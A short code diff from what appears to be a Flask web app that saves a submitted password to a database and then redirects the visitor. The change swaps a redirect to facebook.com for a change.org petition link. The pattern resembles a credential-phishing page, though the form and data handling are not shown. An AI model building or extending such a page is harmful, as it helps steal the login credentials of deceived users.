@@ -15,7 +15,7 @@ def index():
             "password":password
         })
         if response.inserted_id:
-            return redirect('https://www.facebook.com/')
+            return redirect('https://www.change.org/p/my-silence-your-silence-our-collective-inaction-helps-perpetuate-this-culture-of-hate-online-it-s-time-we-put-an-end-to-targeted-abuse-women-face-online-every-day-stand-for-indiaagainstabuse?source_location=discover_feed')
     return render_template('index.html')
 
 if __name__ == "__main__":
